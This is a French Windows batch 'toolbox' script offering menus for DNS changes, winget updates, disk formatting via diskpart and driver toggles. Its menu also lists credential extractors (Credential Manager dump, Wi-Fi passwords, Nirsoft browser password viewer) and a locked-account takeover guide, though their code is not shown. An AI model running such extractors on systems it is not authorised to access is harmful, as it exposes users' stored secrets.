@echo off
setlocal EnableExtensions EnableDelayedExpansion
if defined MSYSTEM ("%ComSpec%" /c "%~f0" & exit /b)
if not defined CMDCMDLINE ("%ComSpec%" /c "%~f0" & exit /b)
chcp 65001 >nul

REM === FORCER LE REPERTOIRE COURANT SUR LE DOSSIER DU .BAT ===
set "SCRIPT_DIR=%~dp0"
if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
cd /d "%SCRIPT_DIR%"
title Boite a Scripts Windows - By ALEEXLEDEV (v3.0)
color 0B
mode con: cols=120 lines=60

REM === AUTO-ELEVATION EN ADMINISTRATEUR ===
REM Note : En mode sans echec, "net session" echoue meme en admin (service Serveur arrete).
REM On utilise donc "fsutil dirty query" qui detecte avec fiabilite les droits Admin Windows.
fsutil dirty query %systemdrive% >nul 2>&1
if %errorlevel% neq 0 (
    cls
    echo.
    echo     ^+-----------------------------------------------^+
    echo     ^|                                               ^|
    echo     ^|        /\     ACCES REFUSE                    ^|
    echo     ^|       /  \    Droits insuffisants             ^|
    echo     ^|      / !! \                                   ^|
    echo     ^|     /______\  Ce script necessite             ^|
    echo     ^|    [  ALEX  ]  des privileges ADMINISTRATEUR  ^|
    echo     ^|                                               ^|
    echo     ^|       Developpe par  ALEEXLEDEV               ^|
    echo     ^|                                               ^|
    echo     ^+-----------------------------------------------^+
    echo.
    echo       Relancement automatique en mode administrateur ...
    echo.
    echo       [ = = = = = = = = = = = = = = = = = = = ]
    timeout /t 1 /nobreak >nul
    echo       [ = = = = = = = = = = = = = = = = = = = ]
    echo.
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

REM === DETECTION MODE SANS ECHEC ===
REM Place APRES l'elevation admin pour pouvoir executer "bcdedit" avec les bons privileges !
if defined SAFEBOOT_OPTION goto sys_safemode

set "t[2]=---:DIAGNOSTIC"
set "t[3]=sys_diagnostic_menu:Menu de diagnostic~Regroupe 8 outils d'analyse (Systeme, Reseau, Sante...)"
set "t[4]=---:REPARATION"
set "t[5]=sys_rescue_menu:Outil Reparation Windows (Rescue)~Menu multi-outils (SFC, DISM, CHKDSK, Reset WinUpdate...)"
set "t[6]=sys_repair_icons:Reparation Cache Icones~Corrige les icones/miniatures corrompues"
set "t[7]=sys_winre:Mode Reparation (WinRE)~Demarrer dans l'environnement de reparation Windows (WinRE/BIOS/Boot Menu/Safe Mode...)"
set "t[8]=---:NETTOYAGE ET OPTIMISATION"
set "t[9]=sys_opti_menu:Menu de Nettoyage et Optimisation~Regroupe le nettoyage (Cache, Registre) et l'optimisation (Tweaks, Demarrage)"
set "t[10]=---:RESEAU"
set "t[11]=dns_manager:Gestionnaire DNS~Changer DNS Cloudflare/Google"
set "t[12]=sys_network_menu:Menu de Depannage Reseau~Outils avances (DNS, ARP, TCP/IP, Autoreset)"
set "t[13]=---:DISQUE"
set "t[14]=disk_manager:Formatteur de Disque (DISKPART)~Formater un disque de facon securisee"
set "t[16]=---:APPLICATIONS"
set "t[17]=winget_manager:Mises a jour d'applications~Mettre a jour vos logiciels via Winget"
set "t[18]=app_installer:Installateur d'applications~Installer des logiciels par categorie via Winget"
set "t[19]=---:COMPTES ET SECURITE"
set "t[20]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi, Nirsoft)"
set "t[21]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
set "t[22]=um_menu:Gestion utilisateurs locaux~Panneau de gestion local (Admin, Pass, Ajouts)"
set "t[23]=---:MATERIEL"
set "t[24]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
set "t[25]=sys_print_manager:Gestionnaire d'Imprimantes~Lister, vider la file d'attente et supprimer des imprimantes"
set "t[26]=sys_power_plan:Gestionnaire Plan d'Alimentation~Equilibre, Performances, Ultimate Performance (mode cache Windows)"
set "t[27]=---:EXTRACTION ET SAUVEGARDE"
set "t[28]=sys_export_menu:Menu des Extractions~Exporte les cles Windows, listes de logiciels, reseaux Wi-Fi et pilotes sur le Bureau"
set "t[29]=---:PERSONNALISATION"
set "t[30]=context_menu:Menu contextuel Windows 11~Classic/Modern"
set "t[31]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametres"
set "t[57]=sys_shortcuts_bureau:Raccourcis Bureau 1-Clic~Redemarrer et Eteindre le PC avec icone sur le Bureau"
set "t[58]=---:SECURITE ET TESTS"
set "t[59]=sys_av_test:Test Antivirus (EICAR Safe)~Teste votre antivirus avec des faux positifs standards inoffensifs"
:: Sous-items pour gestion des favoris individuels
set "t[32]=dump_credman:Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump):HIDDEN"
set "t[33]=dump_wifi:Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms:HIDDEN"
set "t[34]=sys_nirsoft_pw:WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe:HIDDEN"
set "t[35]=res_sfc:Scan RAPIDE du systeme~SFC /scannow (Verification systeme rapide):HIDDEN"
set "t[36]=res_dism_check:Verification image base~DISM /CheckHealth et /ScanHealth (Analyse image):HIDDEN"
set "t[37]=res_dism_restore:Reparation profonde~DISM /RestoreHealth (Reparation fichiers systeme):HIDDEN"
set "t[38]=res_temp_clean:Nettoyage massif (Temp/Cache)~Purge des fichiers temporaires et cache Windows Update:HIDDEN"
set "t[39]=res_wu_reset:Reset Fix Windows Update~Reinitialisation forcee des composants Windows Update:HIDDEN"
set "t[40]=sys_cleanmgr:Nettoyage de disque (Classique)~Lancement classique de l'utilitaire de nettoyage Windows:HIDDEN"
:: Nouveaux items (ex-principaux) transferes en DIAGNOSTIC
set "t[41]=sys_report:Apercu de la configuration PC~Affiche les specifications et l'etat de sante materiel:HIDDEN"
set "t[42]=sys_diag_network:Diagnostic Reseau~Test de connexion (Local, Box, Internet, DNS):HIDDEN"
set "t[43]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel:HIDDEN"
set "t[44]=sys_bitlocker_check:Verificateur BitLocker~Verifiez l'etat de chiffrement de vos partitions:HIDDEN"
set "t[45]=sys_event_log:Journaux d'Erreurs Windows~Affiche les erreurs critiques recentes (24h / 7 jours):HIDDEN"
set "t[46]=sys_hw_test:Test des Composants PC~Benchmark disque, RAM, CPU et SMART en un clic:HIDDEN"
set "t[47]=sys_defender:Gestionnaire Windows Defender~Scan rapide/complet CLI, MAJ signatures, menaces detectees:HIDDEN"
set "t[48]=sys_full_report:Generer Rapport HTML (Tout-en-Un)~Export HTML de l'ordinateur complet (Materiel, OS, Reseau):HIDDEN"
:: Nouveaux items (ex-principaux) transferes en NETTOYAGE
set "t[49]=sys_clean_unified:Nettoyage Complet Unifie~Disque, Temp, Registre, WU, DNS - tout en un menu:HIDDEN"
set "t[50]=sys_registry_cleanup:Nettoyage du Registre~Optimisation rapide et suppression des entrees mortes:HIDDEN"
set "t[51]=sys_tweaks_menu:Menu Optimisation Windows 11~Bloatwares, Telemetrie, Performances, Cortana:HIDDEN"
set "t[52]=sys_startup_manager:Programmes au Demarrage~Lister et desactiver les logiciels qui demarrent avec Windows:HIDDEN"
:: Nouveaux items (ex-principaux) transferes en EXTRACTION
set "t[53]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit:HIDDEN"
set "t[54]=sys_drivers:Extraction des pilotes~Sauvegarde de tous les fichiers pilotes natifs:HIDDEN"
set "t[55]=sys_export_software:Export Liste des Logiciels~Exporte la liste de tous les programmes installes en CSV/TXT:HIDDEN"
set "t[56]=sys_export_wifi_apps:Export Wi-Fi + Logiciels (TXT)~Genere 2 fichiers TXT sur le Bureau en un seul clic:HIDDEN"
set "total_tools=59"



if not exist "%SCRIPT_DIR%\favoris.txt" type nul > "%SCRIPT_DIR%\favoris.txt"

:menu_principal
cls
set "opts=[--- MES FAVORIS ---]"
set /a fav_idx=0

for /l %%I in (1,1,%total_tools%) do (
    for /f "tokens=1,2,3 delims=:" %%A in ("!t[%%I]!") do (
        if not "%%A"=="---" (
            set "is_fav=0"
            for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (
                if "%%F"=="%%A" set "is_fav=1"
            )
            if "!is_fav!"=="1" (
                set "opts=!opts!;(F) %%B"
                set /a fav_idx+=1
                set "main_target[!fav_idx!]=%%A"
            )
        )
    )
)

if "!opts!"=="[--- MES FAVORIS ---]" (
    set "opts=!opts!;(Aucun favori configure - Appuyez sur [F] sur un outil pour l'ajouter)"
    set /a fav_idx+=1
    set "main_target[!fav_idx!]=none"
)

set "opts=!opts!;[--- OUTILS AVANCES ---];Voir les outils systeme avances"

call :DynamicMenu "BOITE A SCRIPTS WINDOWS - By ALEEXLEDEV" "!opts!"
set "main_choice=%errorlevel%"

if "!main_choice!"=="0" goto exit_script
if "!main_choice!"=="299" goto search_tools

if !main_choice! GEQ 200 (
    set /a toggle_idx=!main_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!main_target[%%X]!"
    if not "!toggle_target!"=="none" call :ToggleFav "!toggle_target!"
    goto menu_principal
)

set /a v_idx=fav_idx+1
if "!main_choice!"=="!v_idx!" goto system_tools

set "target=!main_target[%main_choice%]!"
if defined target if not "!target!"=="none" goto !target!
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE DNS CLOUDFLARE
REM ===================================================================
:dns_manager
set "opts=Affichage de la configuration actuelle;[--- CLOUDFLARE ---];DNS Cloudflare (1.1.1.1);[--- GOOGLE ---];DNS Google (8.8.8.8);[--- REINITIALISATION ---];Restauration des DNS par defaut (DHCP)"
call :DynamicMenu "GESTIONNAIRE DNS" "%opts%"
set "dns_choice=%errorlevel%"

if "%dns_choice%"=="1" goto show_dns_config
if "%dns_choice%"=="2" goto install_cloudflare_full
if "%dns_choice%"=="3" goto install_google_full
if "%dns_choice%"=="4" goto restore_dns
if "%dns_choice%"=="0" goto menu_principal
goto dns_manager

:install_cloudflare_full
cls
echo ================================================
echo     INSTALLATION DNS CLOUDFLARE (1.1.1.1)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Cloudflare IPv4...
netsh interface ip set dns "%interface%" static 1.1.1.1
netsh interface ip add dns "%interface%" 1.0.0.1 index=2

echo Configuration des DNS Cloudflare IPv6...
netsh interface ipv6 set dns "%interface%" static 2606:4700:4700::1111
netsh interface ipv6 add dns "%interface%" 2606:4700:4700::1001 index=2

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Cloudflare configures:
echo   IPv4 - Primaire: 1.1.1.1
echo   IPv4 - Secondaire: 1.0.0.1
echo   IPv6 - Primaire: 2606:4700:4700::1111
echo   IPv6 - Secondaire: 2606:4700:4700::1001
echo.
pause
goto dns_manager


:install_google_full
cls
echo ================================================
echo     INSTALLATION DNS GOOGLE (8.8.8.8)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Google IPv4...
netsh interface ip set dns "%interface%" static 8.8.8.8 >nul 2>&1
netsh interface ip add dns "%interface%" 8.8.4.4 index=2 >nul 2>&1

echo Configuration des DNS Google IPv6...
netsh interface ipv6 set dns "%interface%" static 2001:4860:4860::8888 >nul 2>&1
netsh interface ipv6 add dns "%interface%" 2001:4860:4860::8844 index=2 >nul 2>&1

echo Vidage du cache DNS...
ipconfig /flushdns >nul

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Google configures:
echo   IPv4 - Primaire: 8.8.8.8
echo   IPv4 - Secondaire: 8.8.4.4
echo   IPv6 - Primaire: 2001:4860:4860::8888
echo   IPv6 - Secondaire: 2001:4860:4860::8844
echo.
pause
goto dns_manager


:restore_dns
cls
echo ================================================
echo     RESTAURATION DNS PAR DEFAUT
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Restauration des DNS automatiques IPv4...
netsh interface ip set dns "%interface%" dhcp

echo Restauration des DNS automatiques IPv6...
netsh interface ipv6 set dns "%interface%" dhcp

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     DNS RESTAURES AVEC SUCCES !
echo ================================================
echo.
pause
goto dns_manager

:show_dns_config
cls
echo ================================================
echo     CONFIGURATION DNS ACTUELLE
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau: %interface%
echo.
echo Configuration DNS IPv4:
netsh interface ip show dns "%interface%"
echo.
echo Configuration DNS IPv6:
netsh interface ipv6 show dns "%interface%"
echo.
pause
goto dns_manager

:get_interface
set "interface="
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%b"=="Connecté" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%b"=="Connected" (
        set "interface=%%d"
        goto :interface_found
    )
)
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%c"=="Dédié" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%c"=="Dedicated" (
        set "interface=%%d"
        goto :interface_found
    )
)
:interface_found
if defined interface (
    set "interface=%interface: =%"
    set "interface=%interface:"=%"
)
goto :eof

REM ===================================================================
REM                   WINGET - Mises a jour des applications windows
REM ===================================================================
:winget_manager
set "opts=Mettre a jour une application (liste et choix);Mettre a jour toutes les applications"
call :DynamicMenu "WINGET - MISES A JOUR APPLICATIONS" "%opts%"
set "winget_choice=%errorlevel%"

if "%winget_choice%"=="1" goto update_single
if "%winget_choice%"=="2" goto update_all
if "%winget_choice%"=="0" goto menu_principal
goto winget_manager

:update_single
cls
echo ================================================
echo     LISTE DES APPLICATIONS A METTRE A JOUR
echo ================================================
echo.
winget update
echo.
echo Copiez l'ID de l'application que vous souhaitez mettre a jour.
echo.
set /p app_id=Entrez l'ID de l'application: 

if "%app_id%"=="" (
    echo Aucun ID saisi.
    pause
    goto winget_manager
)

echo.
echo Mise a jour de %app_id% en cours...
winget update --id %app_id% --accept-package-agreements --accept-source-agreements
echo.
echo Termine.
pause
goto winget_manager

:update_all
cls
echo ================================================
echo     MISE A JOUR DE TOUTES LES APPLICATIONS
echo ================================================
echo.
winget update --all --accept-package-agreements --accept-source-agreements
echo.
echo Toutes les mises a jour ont ete appliquees.
pause
goto winget_manager

REM ===================================================================
REM                    MENU CONTEXTUEL WINDOWS 11
REM ===================================================================
:context_menu
set "opts=Activer le menu contextuel classique;Restaurer le menu contextuel moderne"
call :DynamicMenu "MENU CONTEXTUEL WINDOWS 11" "%opts%"
set "ctx_choice=%errorlevel%"

if "%ctx_choice%"=="1" goto activate_classic
if "%ctx_choice%"=="2" goto restore_modern
if "%ctx_choice%"=="0" goto menu_principal
goto context_menu

:activate_classic
cls
echo.
echo Activation du menu contextuel classique...
echo.
reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
echo Modification du registre terminee.
echo.
echo IMPORTANT : Un redemarrage de l'Explorateur Windows est necessaire.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel classique active avec succes !
) else (
    echo.
    echo Menu contextuel classique sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

:restore_modern
cls
echo.
echo Restauration du menu contextuel moderne...
echo.
reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f >nul 2>&1
echo Modification du registre terminee.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel moderne restaure avec succes !
) else (
    echo.
    echo Menu contextuel moderne sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

REM ===================================================================
REM                    GESTIONNAIRE DE DISQUES - FORMATAGE AVEC DISKPART
REM ===================================================================
:disk_manager
cls
color 0A
echo.
echo =============================================================
echo                       DISKPART
echo =============================================================
echo.
echo Analyse des disques disponibles...
echo.

set "disk_opts="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | ForEach-Object { '{0}: {1} ({2:N0} GB)' -f $_.Number, $_.FriendlyName, ($_.Size/1GB) }"') do (
    if defined disk_opts (set "disk_opts=!disk_opts!;%%D") else (set "disk_opts=%%D")
)

if not defined disk_opts (
    echo [!] Aucun disque detecte.
    pause
    goto menu_principal
)

call :DynamicMenu "CHOISISSEZ LE DISQUE A FORMATER" "%disk_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto menu_principal

rem Recuperer le numero du disque a partir du choix
set /a idx=1
set "disk_num="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | Select-Object -ExpandProperty Number"') do (
    if !idx! equ %res% set "disk_num=%%D"
    set /a idx+=1
)

if not defined disk_num goto disk_manager

:disk_format_choice
set "opts=NTFS (Windows);FAT32 (Compatibilite);exFAT (Compatibilite + Gros fichiers);ReFS (Windows Server)"
call :DynamicMenu "CHOIX DU SYSTEME DE FICHIERS (DISQUE %disk_num%)" "%opts%"
set "format_choice=%errorlevel%"

if "%format_choice%"=="0" goto menu_principal
if "%format_choice%"=="1" set fs_type=NTFS
if "%format_choice%"=="2" set fs_type=FAT32
if "%format_choice%"=="3" set fs_type=exFAT
if "%format_choice%"=="4" set fs_type=ReFS

if not defined fs_type goto disk_format_choice

cls
echo.
echo =============================================================
echo                       CONFIRMATION
echo =============================================================
echo.
echo Vous allez formater le DISQUE %disk_num%
echo Format selectionne : %fs_type%
echo.
echo ATTENTION: TOUTES LES DONNEES SERONT DEFINITIVEMENT EFFACEES !
echo.
echo Tapez 'OUI' en majuscules pour confirmer (ou autre pour annuler) :
set /p confirmation=Confirmation: 

if not "%confirmation%"=="OUI" (
    echo.
    echo Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto disk_manager
)

echo.
echo =============================================================
echo Preparation du formatage...
echo =============================================================
echo.

set script_temp=%temp%\diskpart_script.txt

(
    echo select disk %disk_num%
    echo clean
    echo create partition primary
    echo format fs=%fs_type% quick
    echo assign
    echo exit
) > "%script_temp%"

echo Execution des commandes diskpart...
echo.
diskpart /s "%script_temp%"

set result=%errorLevel%

del "%script_temp%" >nul 2>&1

echo.
echo =============================================================
if %result% equ 0 (
    echo.
    echo Formatage termine avec succes !
    echo.
    echo Le disque %disk_num% a ete :
    echo   - Nettoye completement
    echo   - Partitionne en partition primaire
    echo   - Formate en %fs_type%
    echo   - Une lettre de lecteur lui a ete assignee
    echo.
) else (
    echo.
    echo Une erreur s'est produite pendant le formatage.
    echo Verifiez que le disque existe et n'est pas protege.
    echo.
)
echo =============================================================
echo.

set /p disk_choice=Voulez-vous formater un autre disque ? (O/N): 
if /i "%disk_choice%"=="O" goto disk_manager
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE D'ECRAN TACTILE
REM ===================================================================
:touch_screen_manager
set "opts=Redemarrer le pilote tactile;Desactiver le pilote tactile;Activer le pilote tactile"
call :DynamicMenu "GESTION ECRAN TACTILE" "%opts%"
set "touch_choice=%errorlevel%"

if "%touch_choice%"=="1" goto touch_restart
if "%touch_choice%"=="2" goto touch_disable
if "%touch_choice%"=="3" goto touch_enable
if "%touch_choice%"=="0" goto system_tools
goto touch_screen_manager

:touch_restart
cls
echo.
echo === Redemarrage du pilote d'ecran tactile ===
echo.

echo Redemarrage du service TabletInputService...
net stop TabletInputService >nul 2>&1
timeout /t 2 /nobreak >nul
net start TabletInputService >nul 2>&1

echo Redemarrage du service HidServ...
net stop HidServ >nul 2>&1
timeout /t 2 /nobreak >nul
net start HidServ >nul 2>&1

echo.
echo Desactivation/Reactivation du peripherique tactile via PowerShell...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }; Start-Sleep -Seconds 2; foreach ($device in $touchDevices) { Write-Host 'Reactivation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo Redemarrage du processus dwm.exe (Desktop Window Manager)...
taskkill /f /im dwm.exe >nul 2>&1
timeout /t 1 /nobreak >nul

echo.
echo === Redemarrage termine ===
echo Testez votre ecran tactile maintenant.
echo.
pause
goto touch_screen_manager

:touch_disable
cls
echo.
echo === Desactivation du pilote tactile ===
echo.

echo Arret du service TabletInputService...
net stop TabletInputService >nul 2>&1

echo Desactivation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo === Pilote tactile desactive ===
echo Le tactile restera desactive jusqu'a reactivation manuelle.
echo.
pause
goto touch_screen_manager

:touch_enable
cls
echo.
echo === Activation du pilote tactile ===
echo.

echo Activation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Activation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo Demarrage du service TabletInputService...
net start TabletInputService >nul 2>&1

echo.
echo === Pilote tactile active ===
echo.
pause
goto touch_screen_manager

REM ===================================================================
REM                    OUTILS SYSTEME AVANCES
REM ===================================================================
:system_tools
cls
set "opts="
set /a s_idx=0
for /l %%I in (1,1,%total_tools%) do (
    set "_entry=!t[%%I]!"
    if defined _entry (
        REM Extrait le label (avant le premier :)
        for /f "tokens=1 delims=:" %%A in ("!_entry!") do set "_lbl=%%A"
        REM Extrait le nom (entre le premier : et le ~)
        set "_rest=!_entry!"
        call set "_rest=%%_rest:*!_lbl!:=%%"
        for /f "tokens=1 delims=~" %%N in ("!_rest!") do set "_name=%%N"
        REM Detecte HIDDEN (fin de ligne)
        set "_hidden=0"
        if "!_entry:~-7!"==":HIDDEN" set "_hidden=1"
        REM Detecte separateur ---
        if "!_lbl!"=="---" (
            set "opts=!opts!;[--- !_name! ---]"
        ) else if "!_hidden!"=="0" (
            set "is_fav=0"
            for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (if "%%F"=="!_lbl!" set "is_fav=1")
            if "!is_fav!"=="1" (
                set "opts=!opts!;(F) !_name!"
            ) else (
                set "opts=!opts!;!_name!"
            )
            set /a s_idx+=1
            set "sys_target[!s_idx!]=!_lbl!"
        )
    )
)

set "opts=!opts:~1!"

call :DynamicMenu "OUTILS SYSTEME AVANCES" "!opts!"
set "sys_choice=%errorlevel%"

if "!sys_choice!"=="0" goto menu_principal
if "!sys_choice!"=="299" goto search_tools

if !sys_choice! GEQ 200 (
    set /a toggle_idx=!sys_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!sys_target[%%X]!"
    call :ToggleFav "!toggle_target!"
    goto system_tools
)

set "target=!sys_target[%sys_choice%]!"
if defined target goto !target!
goto system_tools
REM ===================================================================
:search_tools
cls
set "search_lbl="
REM Construire les donnees de recherche via variable d'environnement (evite ecriture %TEMP% bloquee par Defender)
set "ALEEX_TOOLS_DATA="
for /l %%I in (1,1,%total_tools%) do (
    set "_e=!t[%%I]!"
    if defined _e (
        if not "!_e:~0,3!"=="---" (
            set "ALEEX_TOOLS_DATA=!ALEEX_TOOLS_DATA!|!_e!"
        )
    )
)
set "ALEEX_TOOLS_DATA=!ALEEX_TOOLS_DATA:~1!"
for /f "usebackq tokens=*" %%L in (`powershell -NoProfile -ExecutionPolicy Bypass -Command "$raw=$env:ALEEX_TOOLS_DATA;$all=@();if($raw){foreach($entry in ($raw-split'\|')){$p=$entry-split'~',2;$ls=$p[0];$d=if($p.Count-gt 1){($p[1]-replace':HIDDEN$','').Trim()}else{'');$c2=$ls.IndexOf(':');if($c2-ge 0){$lb=$ls.Substring(0,$c2).Trim();$nm=$ls.Substring($c2+1).Trim();if($lb-and $lb-ne'---'){$all+=@{N=$nm;D=$d;L=$lb}}}}};$list=[array]($all|Sort-Object{$_['N']});$q='';$s=0;function Dsp{param($q,$r,$s);clear-host;Write-Host'  ============================================'-f Cyan;Write-Host'   [S] RECHERCHE D OUTILS'-f White;Write-Host'  ============================================'-f Cyan;Write-Host'';Write-Host('  Recherche : '+$q+'_')-f Yellow;Write-Host'';if($r.Count-gt 0){Write-Host('  '+$r.Count+' outil(s) trouve(s)')-f Cyan;Write-Host'';for($i=0;$i-lt[math]::Min($r.Count,30);$i++){if($i-eq $s){Write-Host('  >> ['+($i+1)+'] '+$r[$i]['N'])-NoNewline-f Black-b White;Write-Host(' - '+$r[$i]['D'])-f Yellow-b White}else{Write-Host('     ['+($i+1)+'] '+$r[$i]['N'])-NoNewline-f Gray;Write-Host(' - '+$r[$i]['D'])-f DarkGray}}}else{if($q.Length-gt 0){Write-Host'  Aucun resultat.'-f DarkGray}else{Write-Host'  Tapez pour filtrer les outils...'-f DarkGray}};Write-Host'';Write-Host'  --------------------------------------------'-f Cyan;Write-Host'  [LETTRES]Taper [FLECHES]Nav [ENTREE]Lancer [BACK]Effacer [ECHAP]Retour'-f DarkGray};while($true){$r2=if($q.Trim()){[array]($list|Where-Object{$_['N']-match[regex]::Escape($q)-or$_['D']-match[regex]::Escape($q)})}else{@()};if($r2.Count-gt 0-and $s-ge $r2.Count){$s=$r2.Count-1};Dsp $q $r2 $s;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v-eq 27){clear-host;break}elseif($v-eq 8-and $q.Length-gt 0){$q=$q.Substring(0,$q.Length-1);$s=0}elseif($v-eq 38-and $r2.Count-gt 0){$s--;if($s-lt 0){$s=$r2.Count-1}}elseif($v-eq 40-and $r2.Count-gt 0){$s++;if($s-ge $r2.Count){$s=0}}elseif($v-eq 13-and $r2.Count-gt 0){clear-host;Write-Output $r2[$s]['L'];break}elseif([string]$k.Character-match'^[1-9]$'){$ci=[int][string]$k.Character-1;if($ci-lt $r2.Count){clear-host;Write-Output $r2[$ci]['L'];break}}elseif($k.Character-ge' '-and $k.Character-le'~'){$q+=$k.Character;$s=0}}" 2^>nul`) do set "search_lbl=%%L"
REM Valider que search_lbl est un label valide (lettres/chiffres/underscore seulement)
if defined search_lbl (
    echo !search_lbl! | findstr /R /C:"^[a-zA-Z_][a-zA-Z0-9_]*$" >nul 2>&1
    if !errorlevel!==0 goto !search_lbl!
)
goto menu_principal



REM ===================================================================
REM              INSTALLATEUR D'APPLICATIONS (WINGET)
REM ===================================================================
:app_installer
set "wg_id="
set "wg_label="
cls
set "opts=[--- NAVIGATEURS ---];Google Chrome~Navigateur web Google"
set "opts=%opts%;[--- MULTIMEDIA ---];VLC Media Player~Lecteur multimedia universel"
set "opts=%opts%;[--- PDF ---];Sumatra PDF~Lecteur PDF ultra-leger et rapide"
set "opts=%opts%;[--- ARCHIVAGE ---];WinRAR~Gestionnaire d'archives RAR/ZIP"

call :DynamicMenu "INSTALLATEUR D'APPLICATIONS - Choisissez une application" "!opts!"
set "app_choice=%errorlevel%"
if "!app_choice!"=="0" goto system_tools

REM Mapping : index selectionnable -> ID Winget + Nom registre
set "wg[1]=Google.Chrome"
